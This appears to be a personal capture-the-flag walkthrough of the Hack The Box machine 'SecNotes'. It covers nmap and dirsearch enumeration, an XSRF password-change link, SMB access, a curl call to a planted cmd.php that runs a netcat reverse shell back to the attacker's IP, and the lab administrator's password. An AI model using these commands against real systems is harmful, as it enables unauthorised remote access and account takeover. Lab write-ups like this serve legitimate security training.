nmap
```
┌──(kali㉿kali)-[~/HTB/secnotes]
└─$ sudo nmap -T5 -p- -A -oN nmap 10.129.162.133    
[sudo] password for kali: 
Sorry, try again.
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-17 02:21 EST
Nmap scan report for 10.129.162.133
Host is up (0.045s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE      VERSION
80/tcp   open  http         Microsoft IIS httpd 10.0
| http-title: Secure Notes - Login
|_Requested resource was login.php
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
445/tcp  open  microsoft-ds Windows 10 Enterprise 17134 microsoft-ds (workgroup: HTB)
8808/tcp open  http         Microsoft IIS httpd 10.0
|_http-title: IIS Windows
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 10|2019 (96%)
OS CPE: cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_server_2019
Aggressive OS guesses: Microsoft Windows 10 1903 - 21H1 (96%), Windows Server 2019 (90%), Microsoft Windows 10 1803 (88%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: SECNOTES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows 10 Enterprise 17134 (Windows 10 Enterprise 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: SECNOTES
|   NetBIOS computer name: SECNOTES\x00
|   Workgroup: HTB\x00
|_  System time: 2025-01-16T23:23:44-08:00
|_clock-skew: mean: 2h40m02s, deviation: 4h37m11s, median: 0s
| smb2-time: 
|   date: 2025-01-17T07:23:39
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

TRACEROUTE (using port 445/tcp)
HOP RTT      ADDRESS
1   43.53 ms 10.10.14.1
2   46.52 ms 10.129.162.133

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 143.65 seconds
```

```
┌──(kali㉿kali)-[~/HTB/secnotes]
└─$ dirsearch -u http://10.129.162.133/               
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/HTB/secnotes/reports/http_10.129.162.133/__25-01-17_02-21-48.txt

Target: http://10.129.162.133/

[02:21:48] Starting: 
[02:21:49] 403 -  312B  - /%2e%2e//google.com                               
[02:21:49] 403 -  312B  - /.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd             
[02:22:08] 403 -  312B  - /\..\..\..\..\..\..\..\..\..\etc\passwd           
[02:22:52] 403 -  312B  - /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd     
[02:22:59] 302 -    0B  - /contact.php  ->  login.php                       
[02:23:32] 302 -    0B  - /home.php  ->  login.php                          
[02:23:47] 200 -    1KB - /login.php                                        
[02:23:48] 302 -    0B  - /logout.php  ->  login.php                        
[02:24:23] 200 -    2KB - /register.php                                     
                                                                             
Task Completed


```

![Pasted image 20250117152450](<0. Attachments/Pasted image 20250117152450.png>)

after registering test & test123
![Pasted image 20250117153403](<0. Attachments/Pasted image 20250117153403.png>)

there is a vulnerability of XSS
![Pasted image 20250117153557](<0. Attachments/Pasted image 20250117153557.png>)

XSRF
```
http://10.129.162.133/change_pass.php?password=password&confirm_password=password&submit=submit
http://10.10.14.4/complete
```

![Pasted image 20250117161556](<0. Attachments/Pasted image 20250117161556.png>)
i see a hit
![Pasted image 20250117161659](<0. Attachments/Pasted image 20250117161659.png>)

we are now in as tyler
![Pasted image 20250117161735](<0. Attachments/Pasted image 20250117161735.png>)

interesting info
![Pasted image 20250117161807](<0. Attachments/Pasted image 20250117161807.png>)

checking smbmap
![Pasted image 20250117161910](<0. Attachments/Pasted image 20250117161910.png>)

using smbclient
![Pasted image 20250117162124](<0. Attachments/Pasted image 20250117162124.png>)
![Pasted image 20250117162348](<0. Attachments/Pasted image 20250117162348.png>)

checking if it works
![Pasted image 20250117162905](<0. Attachments/Pasted image 20250117162905.png>)

`curl "http://10.129.162.133:8808/cmd.php?cmd=nc.exe+-e+cmd.exe+10.10.14.4+443"`

![Pasted image 20250117163230](<0. Attachments/Pasted image 20250117163230.png>)

intersting file
![Pasted image 20250117163535](<0. Attachments/Pasted image 20250117163535.png>)

search for it
`where /R c:\ bash.exe`
![Pasted image 20250117163640](<0. Attachments/Pasted image 20250117163640.png>)
![Pasted image 20250117163748](<0. Attachments/Pasted image 20250117163748.png>)

priv esc completed
![Pasted image 20250117163918](<0. Attachments/Pasted image 20250117163918.png>)
username-->administrator % password-->u6!4ZwgwOM#^OBf#Nwnh

![Pasted image 20250117164457](<0. Attachments/Pasted image 20250117164457.png>)

